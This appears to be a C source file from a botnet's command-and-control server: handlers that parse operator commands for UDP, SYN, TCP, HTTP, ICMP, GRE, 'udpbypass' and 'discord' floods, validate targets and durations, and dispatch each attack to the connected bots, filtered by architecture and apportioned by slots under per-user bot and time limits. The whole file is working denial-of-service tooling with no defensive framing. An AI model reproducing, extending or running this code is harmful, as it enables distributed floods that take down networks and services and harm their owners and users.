#include "headers/attack_commands.h"
#include "headers/botnet.h"
#include "headers/checks.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <pthread.h>
#include <arpa/inet.h>

extern pthread_mutex_t bot_mutex;
extern pthread_mutex_t cooldown_mutex;
extern int global_cooldown;
extern int bot_count;


static int parse_normal_options(const User *user, const char *arg, AttackOptions *options, char *response);
static void send_attack(const User *user, const char *command, const AttackOptions *options, char *response);

static int validate_ip_or_subnet(const char *ip) {
    char buf[32];
    strncpy(buf, ip, sizeof(buf)-1);
    buf[sizeof(buf)-1] = 0;
    char *slash = strchr(buf, '/');
    if (slash) {
        *slash = 0;
        int cidr = atoi(slash+1);
        if (cidr < 1 || cidr > 32) return 0;
    }
    struct in_addr addr;
    return inet_aton(buf, &addr);
}

/* For HTTP: accept IP, subnet, or any valid hostname/domain. */
static int validate_host(const char *host) {
    if (!host || host[0] == '\0') return 0;
    /* Already a valid IP/subnet? */
    if (validate_ip_or_subnet(host)) return 1;
    /* Check it's a plausible hostname: [a-zA-Z0-9._-] only */
    for (const char *p = host; *p; p++) {
        char c = *p;
        if (!((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
              (c >= '0' && c <= '9') || c == '.' || c == '-' || c == '_'))
            return 0;
    }
    return 1;
}

void init_attack_options(AttackOptions *options) {
    memset(options, 0, sizeof(AttackOptions));
}

static int validate_attack_base(const User *user, const char *cmd, const char *ip, int time, char *response) {
    if (!validate_ip_or_subnet(ip) || time <= 0 || time > user->maxtime) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Invalid IP/subnet or time\n" RESET);
        return 0;
    }

    if (is_blacklisted(ip)) {
        if (is_private_ip(ip)) {
            snprintf(response, MAX_COMMAND_LENGTH, RED "Error: Cannot attack private/reserved IP addresses\n" RESET);
        } else {
            snprintf(response, MAX_COMMAND_LENGTH, RED "Error: Target is blacklisted\n" RESET);
        }
        return 0;
    }
    
    return 1;
}

static int parse_normal_options(const User *user, const char *arg, AttackOptions *options, char *response) {
    if (strncmp(arg, "len=", 4) == 0) {
        if (options->has_len) {
            snprintf(response, MAX_COMMAND_LENGTH, RED "Duplicate len argument\n" RESET);
            return 0;
        }
        const char *val = arg + 4;
        char *dash = strchr(val, '-');
        if (dash && dash != val) {
            char min_str[32];
            strncpy(min_str, val, dash - val);
            min_str[dash - val] = 0;
            if (!is_valid_int(min_str) || !is_valid_int(dash + 1)) {
                snprintf(response, MAX_COMMAND_LENGTH, RED "Invalid len range (need min-max, both ints)\n" RESET);
                return 0;
            }
            int lmin = atoi(min_str);
            int lmax = atoi(dash + 1);
            if (lmin < 1 || lmax < 1 || lmin > 1500 || lmax > 1500 || lmin > lmax) {
                snprintf(response, MAX_COMMAND_LENGTH, RED "Invalid len range (1-1500, min <= max)\n" RESET);
                return 0;
            }
            options->len_min = lmin;
            options->len_max = lmax;
            options->len = lmin;
        } else {
            if (!is_valid_int(val)) {
                snprintf(response, MAX_COMMAND_LENGTH, RED "Invalid len (need int or min-max)\n" RESET);
                return 0;
            }
            int lval = atoi(val);
            if (lval < 1 || lval > 1500) {
                snprintf(response, MAX_COMMAND_LENGTH, RED "Invalid len (1-1500)\n" RESET);
                return 0;
            }
            options->len = lval;
            options->len_min = lval;
            options->len_max = lval;
        }
        options->has_len = 1;
    } 
    else if (strncmp(arg, "srcport=", 8) == 0) {
        if (options->has_srcport) {
            snprintf(response, MAX_COMMAND_LENGTH, RED "Duplicate srcport option\n" RESET);
            return 0;
        }
        const char *val = arg + 8;
        if (!is_valid_int(val)) {
            snprintf(response, MAX_COMMAND_LENGTH, RED "Invalid srcport (need int)\n" RESET);
            return 0;
        }
        options->srcport = atoi(val);
        if (!validate_srcport(options->srcport)) {
            snprintf(response, MAX_COMMAND_LENGTH, RED "Invalid srcport value (must be 1-65535)\n" RESET);
            return 0;
        }
        options->has_srcport = 1;
    }
    else if (strncmp(arg, "sarch=", 6) == 0) {
        if (options->has_sarch) {
            snprintf(response, MAX_COMMAND_LENGTH, RED "Duplicate sarch argument\n" RESET);
            return 0;
        }
        strncpy(options->sarch, arg + 6, sizeof(options->sarch) - 1);
        options->sarch[sizeof(options->sarch) - 1] = 0;
        options->has_sarch = 1;
    }
    else if (strncmp(arg, "cons=", 5) == 0) {
        if (options->has_cons) {
            snprintf(response, MAX_COMMAND_LENGTH, RED "Duplicate cons argument\n" RESET);
            return 0;
        }
        const char *val = arg + 5;
        if (!is_valid_int(val)) {
            snprintf(response, MAX_COMMAND_LENGTH, RED "Invalid cons (need int)\n" RESET);
            return 0;
        }
        options->cons = atoi(val);
        if (options->cons < 1) {
            snprintf(response, MAX_COMMAND_LENGTH, RED "cons must be >= 1\n" RESET);
            return 0;
        }
        options->has_cons = 1;
    }
    return 1;
}

static void parse_base_args(char *argstr, char **args, int *arg_count) {
    if (strlen(argstr) > 0) {
        char *token = strtok(argstr, " ");
        while (token && *arg_count < 127) {
            args[*arg_count] = token;
            (*arg_count)++;
            token = strtok(NULL, " ");
        }
    }
}

int is_attack_command(const char *command) {
    return strncmp(command, "udpplain", 8) == 0 ||
           strncmp(command, "udp",      3) == 0 ||
           strncmp(command, "syn",      3) == 0 ||
           strncmp(command, "tcp",      3) == 0 ||
           strncmp(command, "http",     4) == 0 ||
           strncmp(command, "icmp",     4) == 0 ||
           strncmp(command, "gre",      3) == 0 ||
           strncmp(command, "pps",      3) == 0 ||
           strncmp(command, "udpbypass",9) == 0 ||
           strncmp(command, "discord",  7) == 0;
}


/* ── Generic handler factory — all new methods share the same parse logic ── */
static void handle_generic_l4(const User *user, const char *command,
                               char *response, const char *usage) {
    char cmd[16], ip[32], argstr[MAX_COMMAND_LENGTH];
    int port = 0, t = 0;
    AttackOptions options;
    init_attack_options(&options);
    memset(cmd, 0, sizeof(cmd));
    memset(ip, 0, sizeof(ip));
    memset(argstr, 0, sizeof(argstr));

    int result = sscanf(command, "%15s %31s %d %d %[^\n]", cmd, ip, &port, &t, argstr);
    if (result < 4) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Usage: %s\n" RESET, usage);
        return;
    }
    if (result == 4) argstr[0] = '\0';

    if (!validate_attack_base(user, cmd, ip, t, response)) return;
    if (!validate_port(port)) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Invalid port\n" RESET);
        return;
    }

    char *args[256] = {0};
    int arg_count = 0;
    parse_base_args(argstr, args, &arg_count);
    for (int i = 0; i < arg_count; i++) {
        if (!parse_normal_options(user, args[i], &options, response)) return;
    }
    send_attack(user, command, &options, response);
}


/* Helper: checks if bot i matches the sarch filter in options.
   Returns 1 if it matches (or no sarch filter set). */
static int bot_matches_sarch(int i, const AttackOptions *options) {
    if (!options->has_sarch) return 1;
    char sarch_copy[128];
    strncpy(sarch_copy, options->sarch, sizeof(sarch_copy) - 1);
    sarch_copy[sizeof(sarch_copy) - 1] = 0;
    char *saveptr;
    char *tok = strtok_r(sarch_copy, ",", &saveptr);
    while (tok) {
        if (strcmp(tok, bots[i].arch) == 0) return 1;
        tok = strtok_r(NULL, ",", &saveptr);
    }
    return 0;
}

static void send_attack(const User *user, const char *command, const AttackOptions *options, char *response) {
    /* Read maxslots BEFORE acquiring bot_mutex — never nest mutexes in this order. */
    int maxslots;
    pthread_mutex_lock(&g_maxslots_mutex);
    maxslots = g_maxslots;
    pthread_mutex_unlock(&g_maxslots_mutex);
    if (maxslots < 1) maxslots = 1;

    pthread_mutex_lock(&bot_mutex);

    /* ── Determine effective bot limit ──────────────────────────────────
     * Priority:
     *   1. cons=M  → slot-based: (eligible_bots * M) / maxslots
     *   2. default  → all bots up to user->maxbots
     * ────────────────────────────────────────────────────────────────── */
    int effective_limit;

    if (options->has_cons) {
        int cons = options->cons;
        if (cons > maxslots) cons = maxslots;   /* clamp to max slots */

        /* Pass 1: count eligible bots (respecting sarch) */
        int eligible = 0;
        for (int i = 0; i < bot_count; i++) {
            if (!bots[i].is_valid || bots[i].socket <= 0) continue;
            if (!bot_matches_sarch(i, options)) continue;
            eligible++;
        }

        effective_limit = (eligible > 0) ? ((eligible * cons) / maxslots) : 0;
        if (effective_limit < 1 && eligible > 0) effective_limit = 1;
        /* Also respect user->maxbots ceiling */
        if (effective_limit > user->maxbots) effective_limit = user->maxbots;

    } else {
        effective_limit = (user->maxbots < bot_count) ? user->maxbots : bot_count;
    }

    /* Pass 2: send attack to the first effective_limit matching bots */
    int sent_bots = 0;
    for (int i = 0; i < bot_count && sent_bots < effective_limit; i++) {
        if (!bots[i].is_valid || bots[i].socket <= 0) continue;
        if (!bot_matches_sarch(i, options)) continue;
        send(bots[i].socket, command, strlen(command), MSG_NOSIGNAL);
        sent_bots++;
    }

    pthread_mutex_unlock(&bot_mutex);

    if (sent_bots == 0) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "No matching bots found\n" RESET);
        return;
    }

    char cmd[16], target[256];
    int port = 0, duration = 0;

    if (sscanf(command, "%15s %255s %d %d", cmd, target, &port, &duration) >= 4) {
        pthread_mutex_lock(&cooldown_mutex);
        global_cooldown = duration;
        pthread_mutex_unlock(&cooldown_mutex);

        /* Show slot info if cons= was used */
        if (options->has_cons) {
            snprintf(response, MAX_COMMAND_LENGTH,
                RESET "Attack sent to " YELLOW "%d" RESET " bots"
                " (" LIGHT_BLUE "%d/%d slots" RESET ")"
                " → " YELLOW "%s" RESET " for " YELLOW "%ds" RESET "\n",
                sent_bots, options->cons, maxslots, target, duration);
        } else {
            snprintf(response, MAX_COMMAND_LENGTH,
                RESET "Attack sent to " YELLOW "%d" RESET " bots"
                " → " YELLOW "%s" RESET " for " YELLOW "%ds" RESET "\n",
                sent_bots, target, duration);
        }
    } else {
        snprintf(response, MAX_COMMAND_LENGTH,
                 RESET "Attack sent to " YELLOW "%d" RESET " bots\n", sent_bots);
    }
}

void handle_pps_command(const User *user, const char *command, char *response) {
    char cmd[16], ip[32], argstr[MAX_COMMAND_LENGTH];
    int t = 0;
    AttackOptions options;
    init_attack_options(&options);

    memset(cmd, 0, sizeof(cmd));
    memset(ip,  0, sizeof(ip));
    memset(argstr, 0, sizeof(argstr));
    int port = 0;
    int result = sscanf(command, "%15s %31s %d %d %[^\n]", cmd, ip, &port, &t, argstr);
    if (result < 4) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Usage: pps <ipv4> <dport> <time> [cons=N sarch=ARCH]\n" RESET);
        return;
    }
    if (!validate_port(port)) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Invalid port\n" RESET);
        return;
    }
    if (!validate_attack_base(user, cmd, ip, t, response)) return;

    char *args[256] = {0};
    int arg_count = 0;
    parse_base_args(argstr, args, &arg_count);
    for (int i = 0; i < arg_count; i++) {
        if (strncmp(args[i], "sarch=", 6) == 0 ||
            strncmp(args[i], "cons=",  5) == 0) {
            if (!parse_normal_options(user, args[i], &options, response)) return;
        } else {
            snprintf(response, MAX_COMMAND_LENGTH, RED "Unknown argument: %s\n" RESET, args[i]);
            return;
        }
    }
    send_attack(user, command, &options, response);
}

void handle_udpbypass_command(const User *user, const char *command, char *response) {
    char cmd[16], ip[32], argstr[MAX_COMMAND_LENGTH];
    int t = 0;
    AttackOptions options;
    init_attack_options(&options);
    memset(cmd, 0, sizeof(cmd)); memset(ip, 0, sizeof(ip)); memset(argstr, 0, sizeof(argstr));
    int port = 0;
    if (sscanf(command, "%15s %31s %d %d %[^\n]", cmd, ip, &port, &t, argstr) < 4) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Usage: udpbypass <ip> <dport> <time> [len=N cons=N sarch=ARCH]\n" RESET);
        return;
    }
    if (!validate_port(port)) { snprintf(response, MAX_COMMAND_LENGTH, RED "Invalid port\n" RESET); return; }
    if (!validate_attack_base(user, cmd, ip, t, response)) return;
    char *args[256] = {0}; int arg_count = 0;
    parse_base_args(argstr, args, &arg_count);
    for (int i = 0; i < arg_count; i++) {
        if (strncmp(args[i], "len=",   4) == 0 ||
            strncmp(args[i], "sarch=", 6) == 0 ||
            strncmp(args[i], "cons=",  5) == 0) {
            if (!parse_normal_options(user, args[i], &options, response)) return;
        } else { snprintf(response, MAX_COMMAND_LENGTH, RED "Unknown argument: %s\n" RESET, args[i]); return; }
    }
    send_attack(user, command, &options, response);
}

void handle_discord_command(const User *user, const char *command, char *response) {
    char cmd[16], ip[32], argstr[MAX_COMMAND_LENGTH];
    int t = 0;
    AttackOptions options;
    init_attack_options(&options);
    memset(cmd, 0, sizeof(cmd)); memset(ip, 0, sizeof(ip)); memset(argstr, 0, sizeof(argstr));
    int port = 0;
    if (sscanf(command, "%15s %31s %d %d %[^\n]", cmd, ip, &port, &t, argstr) < 4) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Usage: discord <ip> <port> <time> [cons=N sarch=ARCH]\n" RESET);
        return;
    }
    if (!validate_port(port)) { snprintf(response, MAX_COMMAND_LENGTH, RED "Invalid port\n" RESET); return; }
    if (!validate_attack_base(user, cmd, ip, t, response)) return;
    char *args[256] = {0}; int arg_count = 0;
    parse_base_args(argstr, args, &arg_count);
    for (int i = 0; i < arg_count; i++) {
        if (strncmp(args[i], "sarch=", 6) == 0 ||
            strncmp(args[i], "cons=",  5) == 0) {
            if (!parse_normal_options(user, args[i], &options, response)) return;
        } else { snprintf(response, MAX_COMMAND_LENGTH, RED "Unknown argument: %s\n" RESET, args[i]); return; }
    }
    send_attack(user, command, &options, response);
}

void handle_udpplain_command(const User *user, const char *command, char *response) {
    char cmd[16], ip[32], argstr[MAX_COMMAND_LENGTH];
    int time = 0;
    AttackOptions options;
    init_attack_options(&options);

    memset(cmd, 0, sizeof(cmd));
    memset(ip, 0, sizeof(ip));
    memset(argstr, 0, sizeof(argstr));
    int port = 0;
    int result = sscanf(command, "%15s %31s %d %d %[^\n]", cmd, ip, &port, &time, argstr);
    if (result < 4) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Usage: !udpplain <ipv4> <dport> <time> [options]\n" RESET);
        return;
    }

    if (!validate_port(port)) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Invalid port\n" RESET);
        return;
    }

    if (!validate_attack_base(user, cmd, ip, time, response)) {
        return;
    }

    char *args[256] = {0};
    int arg_count = 0;
    parse_base_args(argstr, args, &arg_count);

    for (int i = 0; i < arg_count; i++) {
        if (strncmp(args[i], "len=",    4) == 0 ||
            strncmp(args[i], "sarch=",  6) == 0 ||
            strncmp(args[i], "cons=",   5) == 0 ||
            strncmp(args[i], "usleep=", 7) == 0 ||
            strncmp(args[i], "msg=",    4) == 0) {
            if (!parse_normal_options(user, args[i], &options, response)) {
                return;
            }
        } else {
            snprintf(response, MAX_COMMAND_LENGTH, RED "Unknown argument: %s\n" RESET, args[i]);
            return;
        }
    }

    send_attack(user, command, &options, response);
}

void handle_syn_command(const User *user, const char *command, char *response) {
    char cmd[16], ip[32], argstr[MAX_COMMAND_LENGTH];
    int port = 0, time = 0;
    AttackOptions options;
    init_attack_options(&options);

    memset(cmd, 0, sizeof(cmd));
    memset(ip, 0, sizeof(ip));
    memset(argstr, 0, sizeof(argstr));

    int result = sscanf(command, "%15s %31s %d %d %[^\n]", cmd, ip, &port, &time, argstr);
    if (result < 4) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Usage: !syn <ipv4> <dport> <time> [options]\n" RESET);
        return;
    }

    if (result == 4) {
        argstr[0] = '\0';
    }

    if (!validate_attack_base(user, cmd, ip, time, response)) {
        return;
    }

    if (!validate_port(port)) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Invalid port\n" RESET);
        return;
    }

    char *args[256] = {0};
    int arg_count = 0;
    parse_base_args(argstr, args, &arg_count);

    for (int i = 0; i < arg_count; i++) {
        if (!parse_normal_options(user, args[i], &options, response)) {
            return;
        }
    }

    send_attack(user, command, &options, response);
}

/* ─────────────────── UDP (socket flood) ─────────────────── */
void handle_udp_command(const User *user, const char *command, char *response) {
    char cmd[16], ip[32], argstr[MAX_COMMAND_LENGTH];
    int port = 0, time = 0;
    AttackOptions options;
    init_attack_options(&options);
    memset(cmd, 0, sizeof(cmd)); memset(ip, 0, sizeof(ip)); memset(argstr, 0, sizeof(argstr));
    int result = sscanf(command, "%15s %31s %d %d %[^\n]", cmd, ip, &port, &time, argstr);
    if (result < 4) { snprintf(response, MAX_COMMAND_LENGTH, RED "Usage: udp <ip> <port> <time> [opts]\n" RESET); return; }
    if (result == 4) argstr[0] = '\0';
    if (!validate_port(port)) { snprintf(response, MAX_COMMAND_LENGTH, RED "Invalid port\n" RESET); return; }
    if (!validate_attack_base(user, cmd, ip, time, response)) return;
    char *args[256] = {0}; int arg_count = 0;
    parse_base_args(argstr, args, &arg_count);
    for (int i = 0; i < arg_count; i++) {
        if (!parse_normal_options(user, args[i], &options, response)) return;
    }
    send_attack(user, command, &options, response);
}

/* ─────────────────── TCP flood ─────────────────── */
void handle_tcp_command(const User *user, const char *command, char *response) {
    handle_generic_l4(user, command, response, "tcp <ip> <port> <time> [opts]");
}

/* ─────────────────── HTTP flood ─────────────────── */
void handle_http_command(const User *user, const char *command, char *response) {
    char cmd[16], ip[256], argstr[MAX_COMMAND_LENGTH];
    int port = 0, time = 0;
    AttackOptions options;
    init_attack_options(&options);
    memset(cmd, 0, sizeof(cmd)); memset(ip, 0, sizeof(ip)); memset(argstr, 0, sizeof(argstr));
    int result = sscanf(command, "%15s %255s %d %d %[^\n]", cmd, ip, &port, &time, argstr);
    if (result < 4) { snprintf(response, MAX_COMMAND_LENGTH, RED "Usage: http <host/ip> <port> <time> [opts]\n" RESET); return; }
    if (result == 4) argstr[0] = '\0';
    if (!validate_port(port)) { snprintf(response, MAX_COMMAND_LENGTH, RED "Invalid port\n" RESET); return; }
    /* HTTP accepts domains too — use validate_host instead of IP-only check */
    if (!validate_host(ip)) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Invalid host/IP\n" RESET);
        return;
    }
    if (time <= 0 || time > user->maxtime) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Invalid time (max %d)\n" RESET, user->maxtime);
        return;
    }
    if (is_blacklisted(ip)) {
        if (is_private_ip(ip)) {
            snprintf(response, MAX_COMMAND_LENGTH, RED "Error: Cannot attack private/reserved IP addresses\n" RESET);
        } else {
            snprintf(response, MAX_COMMAND_LENGTH, RED "Error: Target is blacklisted\n" RESET);
        }
        return;
    }
    char *args[256] = {0}; int arg_count = 0;
    parse_base_args(argstr, args, &arg_count);
    for (int i = 0; i < arg_count; i++) {
        if (strncmp(args[i], "httpmode=", 9) == 0) {
            if (options.has_httpmode) { snprintf(response, MAX_COMMAND_LENGTH, RED "Duplicate httpmode\n" RESET); return; }
            options.has_httpmode = 1;
            char *mode = (char*)(args[i] + 9);
            char *tok = strtok(mode, ",");
            while (tok) {
                if (strcmp(tok, "get") == 0) options.http_method |= 1;
                else if (strcmp(tok, "post") == 0) options.http_method |= 2;
                else if (strcmp(tok, "head") == 0) options.http_method |= 4;
                else { snprintf(response, MAX_COMMAND_LENGTH, RED "Invalid httpmode: %s\n" RESET, tok); return; }
                tok = strtok(NULL, ",");
            }
        } else if (!parse_normal_options(user, args[i], &options, response)) return;
    }
    if (!options.has_httpmode) { options.http_method = 1; options.has_httpmode = 1; }
    send_attack(user, command, &options, response);
}

/* ─────────────────── ICMP flood ─────────────────── */
void handle_icmp_command(const User *user, const char *command, char *response) {
    char cmd[16], ip[32], argstr[MAX_COMMAND_LENGTH];
    int time = 0;
    AttackOptions options;
    init_attack_options(&options);
    memset(cmd, 0, sizeof(cmd)); memset(ip, 0, sizeof(ip)); memset(argstr, 0, sizeof(argstr));
    int result = sscanf(command, "%15s %31s %d %[^\n]", cmd, ip, &time, argstr);
    if (result == 3) argstr[0] = '\0';
    else if (result < 3) { snprintf(response, MAX_COMMAND_LENGTH, RED "Usage: icmp <ip> <time> [opts]\n" RESET); return; }
    if (!validate_attack_base(user, cmd, ip, time, response)) return;
    char *args[256] = {0}; int arg_count = 0;
    parse_base_args(argstr, args, &arg_count);
    for (int i = 0; i < arg_count; i++) {
        if (!parse_normal_options(user, args[i], &options, response)) return;
    }
    send_attack(user, command, &options, response);
}

/* ─────────────────── GRE flood ─────────────────── */
void handle_gre_command(const User *user, const char *command, char *response) {
    char cmd[16], ip[32], argstr[MAX_COMMAND_LENGTH];
    int time = 0;
    AttackOptions options;
    init_attack_options(&options);
    memset(cmd, 0, sizeof(cmd)); memset(ip, 0, sizeof(ip)); memset(argstr, 0, sizeof(argstr));
    int result = sscanf(command, "%15s %31s %d %[^\n]", cmd, ip, &time, argstr);
    if (result == 3) argstr[0] = '\0';
    else if (result < 3) { snprintf(response, MAX_COMMAND_LENGTH, RED "Usage: gre <ip> <time> [opts]\n" RESET); return; }
    if (!validate_attack_base(user, cmd, ip, time, response)) return;
    char *args[256] = {0}; int arg_count = 0;
    parse_base_args(argstr, args, &arg_count);
    for (int i = 0; i < arg_count; i++) {
        if (strncmp(args[i], "proto=", 6) == 0) {
            strncpy(options.proto, args[i]+6, sizeof(options.proto)-1);
            options.proto[sizeof(options.proto)-1] = 0;
            if (strcmp(options.proto, "tcp") != 0 && strcmp(options.proto, "udp") != 0) {
                snprintf(response, MAX_COMMAND_LENGTH, RED "Invalid proto (tcp or udp)\n" RESET); return;
            }
            options.has_proto = 1;
        } else if (strncmp(args[i], "gport=", 6) == 0) {
            options.gport = atoi(args[i]+6);
            if (!validate_port(options.gport)) { snprintf(response, MAX_COMMAND_LENGTH, RED "Invalid gport\n" RESET); return; }
            options.has_gport = 1;
        } else if (!parse_normal_options(user, args[i], &options, response)) return;
    }
    send_attack(user, command, &options, response);
}
